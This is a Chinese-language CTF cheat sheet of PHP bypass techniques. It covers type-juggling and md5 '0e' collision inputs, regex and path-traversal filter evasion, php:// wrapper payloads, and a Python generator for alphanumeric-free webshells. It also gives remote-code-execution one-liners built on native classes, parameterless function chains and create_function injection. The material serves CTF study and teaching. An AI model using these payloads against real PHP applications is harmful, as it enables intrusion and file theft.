## 类型转换

PHP 是一个弱类型语言, 变量之间进行比较时, 若两个变量类型不一致, 会进行强制类型转换

[https://www.php.net/manual/zh/language.types.type-juggling.php](https://www.php.net/manual/zh/language.types.type-juggling.php)

```php
'a' == 0 // true

'1a' == 0 // false
'1a' == 1 // true

'a1' == 0 // true
'a1' == 1 // false

'123aa' == 123 // true
'aa123' == 123 // false

'123aa456' == 123 // true

'0e123' == '0e456' //true
```

非数字开头的字符串转换成 int 类型时会变成 0, 数字开头的字符串转换 int 类型后会保留开头的数字

string 类型的转换会从最左边开始, 直到遇到非数字的字符时停止

含 e 的字符串转换成 int 类型时会被当做科学计数法处理, `123e456` 表示 123 的 456 次方

`0e123` 表示 0 的 123 次方, 总是等于 0

`0e456` 同理

另外在数字开头加入 `\f \t \s \n \r` 等返回 true

```php
' 36'=='36'; // true
'36 '=='36'; // false
'3 6'=='36'; // false

"\n36"=="36"; // true
"\t36"=="36"; // true

"36\n"=="36"; // false
"36\t"=="36"; // false

" 36" === "36" // false
"36 " === "36" // false

"\n36"==="36"; // false
"\t36"==="36"; // false
```

## 进制转换

一个十进制数与十六进制/八进制数比较时, PHP 会将十六进制/八进制数转换为十进制数

十六进制数以 `0x` 开头, 八进制数以 `0` 开头

```php
01555 == 877
01555 === 877

0x36D == 877
0x36D === 877
```

以上结果均返回 true

## == 与 ===

[https://www.php.net/manual/zh/language.operators.comparison.php](https://www.php.net/manual/zh/language.operators.comparison.php)

== 弱类型比较, 仅要求两边变量类型转换后的值相等

=== 强类型比较, 不仅要求两个变量的值相等, 还要求变量的类型相同

同理 != 是弱类型比较, 而 !== 是强类型比较

```php
'123' == 123 // true
'123' === 123 // false
```

## preg_match()

 ### 单行/多行匹配

几种模式修饰符

https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php

默认单行匹配匹配换行符

/m 多行匹配不匹配换行符

一个通过这种方式绕过的实例: Apache 换行解析漏洞 (CVE-2017-15715)

[https://blog.csdn.net/qq_46091464/article/details/108278486](https://blog.csdn.net/qq_46091464/article/details/108278486)

[https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html](https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html)

### 传递数组

函数传入数组时会返回 false

### 正则回溯绕过

正则表达式溢出 回溯绕过

[https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

## intval()

```php
intval(mixed $value, int $base = 10): int
```

当 `$base = 0` 时, intval 会检测 value 的格式来决定使用的进制, 可以使用八进制或者十六进制绕过

另外 intval 可以取整 (去除小数点后的部分) 和截断 (去除数字后的字符串, 包括科学计数法)

在数字前加空格也能正常执行 intval

```php
intval('1146.0');
intval('1146.123');
intval('1146aa');

intval('1146e123');

intval('0x117c', 0);
intval('010574', 0);

intval(' 1146');
```

以上结果均返回 1146

## strpos()

`strpos('01234', 0)` 返回的结果是 0 对应的索引 0, 也就是 false

如果是 `!strpos()` 这种则会返回 true

代码使用了 `if(!strpos($str, 0))` 对八进制进行过滤, 可以在字符串开头加空格绕过

strpos() 遇到数组返回 null

strrpos() stripos() strripos() 同理

## is_numeric()

识别科学计数法

`0123e4567` 返回 true

包含非 e 字母返回 false

可以尝试利用 base64 + bin2hex 找到一些只含 e 和数字的 payload

在数字**开头**加入空格 换行符 tab 等特殊字符可以绕过检测

```php
is_numeric(' 36'); // true
is_numeric('36 '); // false
is_numeric('3 6'); // false

is_numeric("\n36"); // true
is_numeric("\t36"); // true

is_numeric("36\n"); // false
is_numeric("36\t"); // false
```

## in_array()

将待搜索的值的类型自动转换为数组中的值的类型

```php
var_dump(in_array('1abc', [1,2,3,4,5])); // true
var_dump(in_array('abc', [1,2,3,4,5])); // false
var_dump(in_array('abc', [0,1,2,3,4,5])); // true
```

## ereg()

存在截断漏洞

`%00` 后面的字符串不解析

## trim()

不过滤 \f 换页符, url 编码后是 `%0c36`

## md5 sha 1 0e漏洞

本质上是科学计数法和类型转换的问题, 0 的任何次方都是 0

加密比较的时候用的必须得是 `==`, 而不是 `===`

```php
'0e123' == '0e456' // true
'0e123' === '0e456' // false
```

md5() sha1() 返回的都是字符串类型

md5 0e payload

```
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
```

sha1 0e payload

```
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
0e1290633704
10932435112
```

其它有时候可能用到的 payload

```
md5(240610708) = 0e462097431906509019562988736854
md5(0e215962017) = 0e291242476940776845150308577824
```

## md5 sha1 数组绕过

md5 加密数组时返回 null

```php
$a = Array();
$b = Array();

md5($a) == md5($b); // null == null true
md5($a) === md5($b); // null === null true
```

sha1 同理

## 路径穿越

通过绝对路径/相对路径绕过正则对文件名的检测, 例如 `preg_match('/flag.php/', $str)`

```
./flag.php
./ctfshow/../flag.php
/var/www/html/flag.php
```

利用 Linux 下的软链接绕过

https://www.anquanke.com/post/id/213235

```
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
```

## 伪协议

[https://www.php.net/manual/zh/wrappers.php](https://www.php.net/manual/zh/wrappers.php)

常见的 php://filter php://input data:// 都很熟悉了

下面是一些不是很常见的 payload

```php
compress.zlib://flag.php
php://filter/ctfshow/resource=flag.php
```

php://filter 遇到不存在的过滤器会直接跳过, 可以绕过一些对关键字的检测

## 运算符优先级

[https://www.php.net/manual/zh/language.operators.precedence.php](https://www.php.net/manual/zh/language.operators.precedence.php)

例如

```php
$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
```

实际上是先赋值

```php
$v0 = is_numeric($v1)
```

然后是这种奇怪的形式

```php
$v0 and is_numeric($v2) and is_numeric($v3);
```

&& 和 || 的顺序也要注意

## 位运算

[https://www.php.net/manual/zh/language.operators.php](https://www.php.net/manual/zh/language.operators.php)

通过 `& | ^ ~` 来构造无字母数字的 webshell

原理是 PHP 7 支持以 `($a)($b)` 的形式调用函数并传参

[https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

python 脚本

```python
import re

preg = '[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\-]+'

def convertToURL(s):
    if s < 16:
        return '%0' + str(hex(s).replace('0x', ''))
    else:
        return '%' + str(hex(s).replace('0x', ''))

def generateDicts():
    dicts = {}
    for i in range(256):
        for j in range(256):
            if not re.match(preg, chr(i), re.I) and not re.match(preg, chr(j), re.I):
                k = i ^ j
                if k in range(32, 127):
                    if not k in dicts.keys():
                        dicts[chr(k)] = [convertToURL(i), convertToURL(j)]
    return dicts

def generatePayload(dicts, payload):
    s1 = ''
    s2 = ''
    for s in payload:
        s1 += dicts[s][0]
        s2 += dicts[s][1]
    return f'("{s1}"^"{s2}")'

dicts = generateDicts()
a = generatePayload(dicts, r'get_ctfshow_fl0g')
print(a)
```

运算方式可以自己改

按位取反 `~` 的话直接在 PHP 里面写就行了

## 三目运算符

有时候构造不带分号 payload 时需要用到三目运算符

```php
return 1?phpinfo():1;
```

1 永远为 true, 于是正常执行 phpinfo

## 函数与数字运算

[https://www.php.net/manual/zh/language.operators.php](https://www.php.net/manual/zh/language.operators.php)

在 PHP 中, 函数与数字进行运算的时候, 函数能够被正常执行

```php
1+phpinfo()+1;
```

`+ - * / & |` 都行, 另外还有 `&& ||`

## 变量覆盖

几种形式

```php
$$key = $$value;

extract()
parse_str()
import_request_variables()
```

思路是 `$_GET` `$_POST` `$_COOKIKE` 相互转换

或者利用 `$GLOBALS` 输出所有的全局变量

另外 parse_str() 接受数组传参 支持数组内变量覆盖

```
?_POST[key1]=36d&_POST[key2]=36d
```

## 非法变量名转换

> 变量名与 PHP 中其它的标签一样遵循相同的规则。一个有效的变量名由字母或者下划线开头，后面跟上任意数量的字母，数字，或者下划线。 按照正常的正则表达式，它将被表述为：'`^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$`'。

非法的字符 (点, 空格, 括号等) 会被转换成下划线

例如过滤了 `_` 如何构造 `__CTFSHOW__` ?

答案是传参的时候参数名写成 `..CTFSHOW..`

另外有一个绕过转换的 trick, PHP < 8 有效

https://blog.csdn.net/mochu7777777/article/details/115050295

`[` 被转换为`_`, 而后面的 `.` 不转换

例如, 构造 `CTF_SHOW.COM` 的变量名可以传参 `CTF[SHOW.COM`

在变量覆盖的时候会很有用

## 不加引号的字符串

PHP 会自动帮我们推断对应值的类型

例如下面的代码执行后会爆 Warning, 但能正常输出 `flag_give_me`

```php
$fl0g = flag_give_me;

echo $fl0g;
```

## 反引号内引用变量

```bash
`$F`; sleep 3
```

反引号内能够引用变量, 与 `"$var"` 类似

https://blog.csdn.net/qq_46091464/article/details/109095382

## \$GLOBALS 和 get_defined_vars()

[https://www.php.net/manual/zh/reserved.variables.globals](https://www.php.net/manual/zh/reserved.variables.globals)

[https://www.php.net/manual/zh/function.get-defined-vars](https://www.php.net/manual/zh/function.get-defined-vars)

`$GLOBALS` 引用全局作用域中可用的全部变量

get_defined_vars() 返回由所有已定义变量所组成的数组

有时候可以从这里面查看 `$flag`

## \$\_SERVER['argv'] 与 \$\_SERVER['QUERY_STRING']

同样都是 GET 传参, 截取 ? 之后的部分

`$_SERVER['argv']` 是数组, `$_SERVER['QUERY_STRING']` 是字符串

`$_SERVER['argv']` 用空格分割数组内容

## session.upload_progress

[https://www.cnblogs.com/litlife/p/10748506.html](https://www.cnblogs.com/litlife/p/10748506.html)

简单来说就是我们可以通过这个机制来上传任意文件到缓存目录 (默认是 /tmp), 并且在缓存目录下产生我们自定义的 session 文件

缓存文件的格式一般是 `php[六位随机大小写字母]`, session 的格式是 `sess_xxx` (xxx 是 Cookie 中 PHPSESSID 的值)

可以配合命令执行的通配符, 或者进行 session 文件包含来 getshell, 有时候需要条件竞争

上传 payload

```html
<form action="http://xxx/" method="POST" enctype="multipart/form-data">
<input type="text" name="PHP_SESSION_UPLOAD_PROGRESS" value="xxx" />
<input type="file" name="file" id="file" />
<input type="submit" name="submit" value="submit" />
</form>
```

## 不含字母数字的函数

`_()` 为 gettext() 别名, 类似于 echo 输出

[https://www.php.net/manual/zh/function.gettext](https://www.php.net/manual/zh/function.gettext)

[https://www.cnblogs.com/lost-1987/articles/3309693.html](https://www.cnblogs.com/lost-1987/articles/3309693.html)

```php
var_dump(call_user_func(call_user_func("_", "get_defined_vars")));
```

以上命令可以返回所有已定义变量

## 原生类列目录/RCE

一般都是 `echo new $v1($v2('xxx'))` 或者 `eval($v('ctfshow'))` 的形式, 有时候可以跳出来执行其它代码

ReflectionClass 和 Exception 里面可以执行其它函数

FilesystemIterator 列目录

[https://www.php.net/manual/zh/filesystemiterator.construct.php](https://www.php.net/manual/zh/filesystemiterator.construct.php)

```php
new Exception(system('xx'))
new ReflectionClass(system('xx'))
new FilesystemIterator(getcwd())
new ReflectionClass('stdClass');system()//
```

## 无参数函数读文件/RCE

无参数函数指形如 `a(b(c()))` 这种不需要参数或者只需要一个参数, 并且对应的参数可以通过另一个函数的返回值来获取的函数

例如在当前目录仅存在 index.php flag.php 的情况下, 无参数读取 flag.php 的内容

```php
show_source(next(array_reverse(scandir(pos(localeconv())))));
```

或者是配合 get 传参进行 rce

```php
eval(end(current(get_defined_vars())))
```

[https://www.freebuf.com/articles/system/242482.html](https://www.freebuf.com/articles/system/242482.html)

[https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE)

## 静态调用方法

两种方式

通过 `::` 访问

```php
$ctfshow::getFlag();
```

通过 `call_user_func($_POST['ctfshow'])` 以数组形式调用静态方法

```
ctfshow[]=ctfshow&ctfshow[]=getFlag
```

[https://www.php.net/manual/zh/language.oop5.static.php](https://www.php.net/manual/zh/language.oop5.static.php)

## call_user_func()

```php
call_user_func(callable $callback, mixed ...$args): mixed
```

调用回调函数, 通常用来做免杀, 不过也可以调用类里面的方法

静态方法

```php
call_user_func('myclass::static_method')
```

传递数组 (动态/静态)

```php
call_user_func(array('myclass', 'static_method'));

call_user_func(array(new myclass(), 'dynamic_method'));
```

## create_function()

```php
create_function(string $args, string $code): string
```

创建匿名函数, 不过这个比较特别, 第一个位置传递的是匿名函数的参数 (有时候可以绕过过滤)

闭合括号执行任意代码

```php
create_function('', "system('whoami');//");
```

参考文章 https://paper.seebug.org/755/

## 根命名空间 \ 绕过过滤

上面的参考文章里也提到了

> PHP 的命名空间默认为 `\`, 所有的函数和类都在 `\` 这个命名空间中, 如果直接写函数名 function_name() 调用, 调用的时候其实相当于写了一个相对路径; 而如果写 \function_name() 这样调用函数. 则其实是写了一个绝对路径. 如果你在其他 namespace 里调用系统类, 就必须写绝对路径这种写法.

有时候可以绕过一些正则, 比如执行的代码不允许以字母开头

```php
\phpinfo();
```

## \_\_autoload 和 class_exists()

```php
class_exists(string $class, bool $autoload = true): bool
```

`__autoload` 是为了定义 PHP 加载未知类的时候进行的操作, 之前强网杯也出过 `spl_autoload` 相关的题 (`spl_autoload` 是 `__autoload` 的默认实现)

这里需要注意的是用 `class_exist` 检查一个类是否存在的时候, 默认会**自动**调用 `__autoload` 方法

## 属性类型不敏感

在 PHP 7.1 + 的版本中, 对属性类型 (public protected private) 不敏感

因为 protected 和 private 反序列化后的结果中含有 `%00`, 部分题目会禁止这种字符, 可在构造 payload 时将属性全部改成 public 来绕过限制 